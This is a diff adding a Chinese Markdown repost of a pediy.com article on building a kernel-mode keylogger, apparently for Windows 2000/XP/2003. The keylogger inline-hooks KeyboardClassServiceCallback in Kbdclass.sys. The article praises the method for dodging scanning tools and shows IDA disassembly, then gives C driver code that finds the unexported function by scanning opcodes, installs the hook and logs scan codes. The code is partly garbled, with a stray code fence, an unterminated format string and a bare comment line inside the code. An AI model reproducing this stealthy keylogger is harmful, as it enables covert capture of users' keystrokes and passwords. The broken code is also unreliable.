@@ -1,0 +1,357 @@
+
+# 键盘记录器的另一种实现
+
+> 原文：[`www.pediy.com/kssd/pediy09/pediy09-162.htm`](https://www.pediy.com/kssd/pediy09/pediy09-162.htm)
+
+> 键盘记录器的另一种实现方法
+
+> 网上流传的键盘记录器种类实在是太多了，从 Ring3 层最简单的 `GetKeyboardState`、键盘钩子到 Ring0 的 `kbfiltr`、`IDTHook`、直接 IO 端口等等，这些实现方法和代码网上都有很多的资料可以查询。今天这里要介绍是另一种 Ring0 键盘记录器，通过 InlineHook `Kbdclass.sys` 的 `KeyboardClassServiceCallback` 函数来实现（呵呵，没错，又 Hook），该函数可以从 WinDDK 的 `Kbdclass` 源代码找到它的原型，如下：
+
+```c
+VOID
+KeyboardClassServiceCallback(
+    IN PDEVICE_OBJECT DeviceObject,
+    IN PKEYBOARD_INPUT_DATA InputDataStart,
+    IN PKEYBOARD_INPUT_DATA InputDataEnd,
+    IN OUT PULONG InputDataConsumed
+    )
+
+typedef struct _KEYBOARD_INPUT_DATA {
+    // Unit number.  E.g., for \\Device\\KeyboardPort0 the unit is '0',
+    // for \\Device\\KeyboardPort1 the unit is '1', and so on.
+    USHORT UnitId;
+    // The "make" scan code (key depression).
+    USHORT MakeCode;
+    // The flags field indicates a "break" (key release) and other
+    // miscellaneous scan code information defined below.
+    USHORT Flags;
+    USHORT Reserved;
+    // Device-specific additional information for the event.
+    ULONG ExtraInformation;
+
+} KEYBOARD_INPUT_DATA, *PKEYBOARD_INPUT_DATA;
+
+#define KEY_MAKE  0       // 某个键被按下
+#define KEY_BREAK 1      // 某个键被释放
+#define KEY_E0    2      // 控制键被按下（如：Ctrl、Alt）
+#define KEY_E1    4      // 控制键被释放（同上）
+```
+
+> 这种实现方法的优点与缺点：
+>
+> **优点：**
+>
+> 1. 可以不用考虑键盘是 PS/2 的，还是 USB 的
+> 2. Hook 的位置比较深，可以有效的躲开一些扫描工具
+> 3. 相对来说，实现也比较简单，只需要关注一个 `CallBack` 函数即可
+>
+> **缺点：**
+>
+> 1. 与标准的键盘过滤驱动相比，稳定性差一点
+> 2. 与 `IDTHook` 相比，不够底层（如：不能获取 QQ 的按键信息， 用其它一些手段还是很容易得到 QQ 的按键信息的，呵呵）
+
+> 具体实现：
+>
+> 由于 `Kbdclass` 内并没有导出该死的 `KeyboardClassServiceCallback`，所以我们第一步是找到该函数在内核内的地址。从 IDA 反汇编的情况来看，`KeyboardClassServiceCallback` 会被 `KeyboardAddDeviceEx` 函数引用：
+
+```asm
+PAGE:00013587                 mov     [esi+4], eax
+PAGE:0001358A                 mov     eax, dword_12044
+PAGE:0001358F                 cmp     eax, esi
+PAGE:00013591                 jz      loc_136E9
+PAGE:00013597                 cmp     eax, ecx
+PAGE:00013599                 jnz     loc_136D7
+PAGE:0001359F                 push    offset _KeyboardClassServiceCallback@16 ; KeyboardClassServiceCallback(x,x,x,x)
+PAGE:000135A4                 push    esi
+PAGE:000135A5                 call    _KbdSendConnectRequest@8 ; KbdSendConnectRequest(x,x)
+PAGE:000135AA                 mov     edi, offset dword_12058
+PAGE:000135AF                 mov     ecx, edi
+PAGE:000135B1                 mov     [ebp+var_4], eax
+PAGE:000135B4                 call    ds:__imp_@ExAcquireFastMutex@4 ; ExAcquireFastMutex(x)
+PAGE:000135BA                 mov     eax, dword_1204C
+PAGE:000135BF                 test    eax, eax
+PAGE:000135C1                 jbe     short loc_135E8
+```
+
+> 我们只要找到 `KeyboardAddDeviceEx`，而这该死的 `KeyboardAddDeviceEx` 函数也不被任何导出的函数引用，所以只有断续往前推，发现在 `DriverEntry` 函数内被调用两次
+>
+> **第一次被调用：**
+
+```asm
+INIT:00014192                 lea     eax, [ebp+DeviceObject]
+INIT:00014198                 push    eax             ; DeviceObject
+INIT:00014199                 push    offset unk_12084 ; int
+INIT:0001419E                 push    [ebp+IoObject]  ; IoObject
+INIT:000141A4                 call    _KbdCreateClassObject@20 ; KbdCreateClassObject(x,x,x,x,x)
+INIT:000141A9                 cmp     eax, ebx
+INIT:000141AB                 mov     [ebp+var_20C], eax
+INIT:000141B1                 jl      loc_142A7
+INIT:000141B7                 mov     eax, [ebp+DeviceObject]
+INIT:000141BD                 mov     eax, [eax+28h]
+INIT:000141C0                 push    ebx             ; int
+INIT:000141C1                 push    [ebp+ValueName] ; ValueName
+INIT:000141C7                 mov     dword_12044, eax
+INIT:000141CC                 push    eax             ; int
+INIT:000141CD                 mov     [eax+28h], bl
+INIT:000141D0                 call    _KeyboardAddDeviceEx@12 ; KeyboardAddDeviceEx(x,x,x)
+INIT:000141D5                 push    ebx             ; Tag
+INIT:000141D6                 push    [ebp+ValueName] ; P
+INIT:000141DC                 call    ds:__imp__ExFreePoolWithTag@8 ; ExFreePoolWithTag(x,x)
+INIT:000141E2                 mov     eax, [ebp+DeviceObject]
+INIT:000141E8                 and     byte ptr [eax+1Ch], 7Fh
+INIT:000141EC                 mov     [ebp+ValueName], ebx
+```
+
+> **第二次被调用：**
+
+```asm
+INIT:0001441F                 lea     edi, [esi+8]
+INIT:00014422                 push    edi             ; DeviceObject
+INIT:00014423                 lea     eax, [ebp+FileObject]
+INIT:00014429                 push    eax             ; FileObject
+INIT:0001442A                 push    80h             ; DesiredAccess
+INIT:0001442F                 lea     eax, [ebp+ObjectName]
+INIT:00014435                 push    eax             ; ObjectName
+INIT:00014436                 call    ds:__imp__IoGetDeviceObjectPointer@16 ; IoGetDeviceObjectPointer(x,x,x,x)
+INIT:0001443C                 test    eax, eax
+INIT:0001443E                 jl      loc_14518
+INIT:00014444                 mov     eax, [edi]
+INIT:00014446                 mov     al, [eax+30h]
+INIT:00014449                 mov     ecx, [ebp+DeviceObject]
+INIT:0001444F                 inc     al
+INIT:00014451                 mov     [ecx+30h], al
+INIT:00014454                 push    [ebp+FileObject] ; int
+INIT:0001445A                 push    [ebp+ValueName]  ; ValueName
+INIT:00014460                 push    esi             ; int
+INIT:00014461                 call    _KeyboardAddDeviceEx@12 ; KeyboardAddDeviceEx(x,x,x)
+INIT:00014466                 cmp     [ebp+ValueName], ebx
+INIT:0001446C                 mov     edi, eax
+INIT:0001446E                 jz      short loc_14483
+INIT:00014470                 push    ebx             ; Tag
+INIT:00014471                 push    [ebp+ValueName] ; P
+INIT:00014477                 call    ds:__imp__ExFreePoolWithTag@8 ; ExFreePoolWithTag(x,x)
+INIT:0001447D                 mov     [ebp+ValueName], ebx
+```
+
+> 通过上面的分析，我来来总结一下 Hook `KeyboardClassServiceCallback` 的步骤：
+>
+> 1. 通过在 `Kbdclass.sys` 文件中的 `INIT` 节内搜索对 `IoGetDeviceObjectPointer` 函数的调用，以些来定位 `KeyboardAddDeviceEx` 函数（从 `INIT` 节开始搜索，而不是 `DriverEntry` 开始的原因是为了兼容 2000、xp、2003）
+> 2. 定位到 `KeyboardAddDeviceEx` 函数后，再从 `KeyboardAddDeviceEx` 定位 `KeyboardClassServiceCallback` 函数
+> 3. Inline Hook `KeyboardClassServiceCallback`
+> 4. 在新的 `KeyboardClassServiceCallback` 函数内处理键盘信息
+> 5. 结束
+
+> 下面是实现代码：
+>
+> 得到 `KeyboardClassServiceCallback` 函数在内核内的地址
+
+```c
+ULONG GetKbdServiceCallBackAddr(PUCHAR Base, ULONG Size, ULONG DriverEntry, ULONG uIATAddr, ULONG ImageBase)
+{
+    ULONG uKbdServiceCallBackAddr = 0;
+    ULONG nRetCode = FALSE;
+    
+    ULONG i = 0;
+    PUCHAR Buffer = (PUCHAR)DriverEntry;
+    ULONG OpcodeLen = 0;
+    ULONG KeyboardAddDeviceExRoutine = 0;
+
+    PROCESS_ERROR(Size > DriverEntry - (ULONG)Base + 0x1200);
+    __try
+    {
+        i = 0;
+
+        while (i < 0x1000 )
+        {
+            if (Buffer[i] == 0xFF &&        //call dword ptr[xxxxx]
+                Buffer[i + 1] == 0x15)
+            {
+                if ( *(ULONG*)(Buffer + i + 2) == uIATAddr )  //判断是否是调用 IoGetDeviceObjectPointer 函数
+                {
+                    break;
+                }
+            }
+            OpcodeLen = GetOpcodeLen(Buffer + i);
+            PROCESS_ERROR(OpcodeLen);
+            i += OpcodeLen;
+        }
+        PROCESS_ERROR(i < 0x1000);
+
+        while (i < 0x1000)               //查找 KeyboardAddDeviceEx 函数地址
+        {
+            if (Buffer[i] == 0xE8)
+            {
+
+
+
+```c
+KeyboardAddDeviceExRoutine = (ULONG)Buffer + i + *(ULONG*)(Buffer + i + 1) + 5;
+break;
+}
+OpcodeLen = GetOpcodeLen(Buffer + i);
+PROCESS_ERROR(OpcodeLen);
+i += OpcodeLen;
+
+}
+PROCESS_ERROR(KeyboardAddDeviceExRoutine);
+
+Buffer = (PUCHAR) KeyboardAddDeviceExRoutine;
+
+i = 0;
+
+while (i < 0x200)
+{
+if (Buffer[i] == 0xF &&        //Jnz xxxxx
+    Buffer[i + 1] == 0x84 &&    
+    Buffer[i + 6] == 0x3B &&    //cmp eax, ecx
+    Buffer[i + 7] == 0xC1 &&
+    Buffer[i + 8] == 0x0F &&    //jnz xxxx
+    Buffer[i + 9] == 0x85 &&
+    Buffer[i + 14] == 0x68 &&    //push KbdServiceCallBack
+    Buffer[i + 20] == 0xE8       //call KbdSendConnectRequest
+
+    )
+{
+    uKbdServiceCallBackAddr = *(ULONG*)(Buffer + i + 14 + 1);
+    break;
+}
+OpcodeLen = GetOpcodeLen(Buffer + i);
+PROCESS_ERROR(OpcodeLen);
+i += OpcodeLen;
+
+}
+PROCESS_ERROR(i < 0x200);
+PROCESS_ERROR(uKbdServiceCallBackAddr);
+
+uKbdServiceCallBackAddr -= ImageBase;
+Buffer = Base + uKbdServiceCallBackAddr;
+
+i = 0;
+while (i < 0x100)
+{
+if (Buffer[i] == 0xFF &&        //call dword ptr[xxxxx]
+    Buffer[i + 1] == 0x15   
+
+    )
+{
+    uKbdServiceCallBackAddr = (ULONG)(Buffer + i) - (ULONG)Base;
+    goto Exit0;
+}
+OpcodeLen = GetOpcodeLen(Buffer + i);
+PROCESS_ERROR(OpcodeLen);
+i += OpcodeLen;
+
+}
+PROCESS_ERROR(i < 0x100);
+
+
+__except(1)
+{
+    goto Exit0;
+}
+
+Exit0:
+
+return uKbdServiceCallBackAddr;
+}
+
+INLINE_HOOK_CONTEXT_BLOCK HookKbdClassBlock = {0};
+
+#define Kbdclass_sys "\\\\SystemRoot\\\\System32\\\\Drivers\\\\Kbdclass.sys"
+
+该死的 HOOK
+
+int HookKbdClassServiceCallBack()
+{
+int nResult = FALSE;
+int nRetCode = FALSE;
+NTSTATUS status = STATUS_UNSUCCESSFUL;
+
+UNICODE_STRING  usDriverName;
+PDRIVER_OBJECT  DriverObject = NULL;
+ULONG     i = 0;
+ULONG     OrgRoutineProc = 0;
+KPELIB     pe;
+ULONG     uEntryPoint = 0;
+UCHAR     *pMap = NULL;
+ULONG     uIATAddr = 0;
+IMAGE_SECTION_HEADER *pSecHdr = NULL;
+
+
+DEBUG_BREAK;
+RtlInitUnicodeString(&usDriverName, L"\\\\Driver\\\\Kbdclass");
+
+status = ObReferenceObjectByName(
+    &usDriverName,
+    0, NULL,
+    0, Api._IoDriverObjectType,
+    KernelMode, NULL,   
+    (PVOID*)&DriverObject
+    );
+PROCESS_DDK_ERROR(status);
+
+nRetCode = pe.Init(Kbdclass_sys, GENERIC_READ);
+PROCESS_ERROR(nRetCode);
+pSecHdr = pe.FindSecByName("INIT");
+PROCESS_ERROR(pSecHdr);
+
+
+pMap = pe.GetMap();
+uEntryPoint = (ULONG)DriverObject->DriverInit - (ULONG)DriverObject->DriverStart;
+uIATAddr = pe.GetIAT("ntoskrnl.exe", "IoGetDeviceObjectPointer");
+uIATAddr += pe.GetImageBase();
+
+OrgRoutineProc = GetKbdServiceCallBackAddr(
+    (PUCHAR)pMap,
+    pe.GetMapSize(),
+    pSecHdr->VirtualAddress + (ULONG)pMap,
+    uIATAddr,
+    pe.GetImageBase()
+    );
+PROCESS_ERROR(OrgRoutineProc);
+
+//OrgRoutineProc -= pe.GetImageBase();
+OrgRoutineProc += (ULONG)DriverObject->DriverStart;
+
+nRetCode = InlineHookFunctionByAddr(
+    KeyboardClassServiceCallback, OrgRoutineProc, 6,
+    &HookKbdClassBlock
+    );
+PROCESS_ERROR(nRetCode);
+GlobalData.IsHooked = TRUE;
+nResult = TRUE;
+Exit0:
+if (DriverObject)
+{
+    ObDereferenceObject(DriverObject);
+
+}
+pe.Unit();
+return nResult;
+}
+
+//注意，这里取到的只是扫描码，怎么转换成 Ascii 码，大家自己网上找吧：）
+
+__declspec(naked)
+
+VOID
+KeyboardClassServiceCallback(
+             IN PDEVICE_OBJECT DeviceObject,
+             IN PKEYBOARD_INPUT_DATA InputDataStart,
+             IN PKEYBOARD_INPUT_DATA InputDataEnd,
+             IN OUT PULONG InputDataConsumed
+             )
+{
+
+    dprintf("UnitId: %08X   MakeCode: %c  Flags: %08X  ExtraInformation: %08X       InputDataStart->UnitId, 
+    InputDataStart->MakeCode, 
+    InputDataStart->Flags, 
+    InputDataStart->ExtraInformation 
+    );
+
+__asm
+{
+    ret
+}
+}
+```
